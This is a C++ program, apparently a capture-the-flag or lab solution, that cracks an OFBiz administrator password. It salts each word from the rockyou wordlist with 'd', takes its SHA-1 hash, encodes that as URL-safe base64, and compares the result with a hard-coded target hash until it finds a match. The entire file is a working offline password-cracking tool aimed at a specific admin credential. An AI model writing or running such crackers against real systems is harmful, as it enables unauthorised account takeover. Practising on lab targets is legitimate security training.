// reading a text file
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include "sha1.hpp"
#include <boost/algorithm/hex.hpp>

using namespace std;

const char base64_url_alphabet[] = {
    'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
    'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
    'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '-', '_'
};

std::string base64_encode(const std::string & in) {
    std::string out;
    int val =0, valb=-6;
    size_t len = in.length();
    unsigned int i = 0;
    for (i = 0; i < len; i++)
    {
        unsigned char c = in[i];
        val = (val<<8) + c;
        valb += 8;
        while (valb >= 0) {
            out.push_back(base64_url_alphabet[(val>>valb)&0x3F]);
            valb -= 6;
        }
    }

    if (valb > -6) {
        out.push_back(base64_url_alphabet[((val<<8)>>(valb+8))&0x3F]);
    }

    return out;
}


int main () {
  int count = 0;
  const string salt = "d";
  const string hx = "\\x";
  string offbiz_admin_password;
  const string target_sha1sum_base64url = "uP0_QaVBpDWFeo8-dRzDqRwXQ2I";

  ifstream myfile ("/opt/useful/rockyou.txt");
  if (myfile.is_open())
  {
      while ( getline (myfile, offbiz_admin_password) )
      {
          // Take a SHA-1 hash of the combined salt and password
          SHA1 checksum;
          string salted_password = salt + offbiz_admin_password;
          checksum.update(salted_password);
          const string hash = checksum.final();

          //Convert the ASCII Hex representation of the hash to raw bytes by inserting escape sequences and running
          char bytes[60] = {0};
          std::string finalhash = boost::algorithm::unhex(hash);
          std::copy(finalhash.begin(), finalhash.end(), bytes);

          // Encode the result as URL base 64
          const string encoded = base64_encode(finalhash);

          cout << "count: " << count <<endl;

          if (encoded == target_sha1sum_base64url){
              cout << "password found!:" << offbiz_admin_password <<endl;
              break;
          }

          count++;
      }
      myfile.close();
  }

  else cout << "Unable to open file";

  return 0;
}
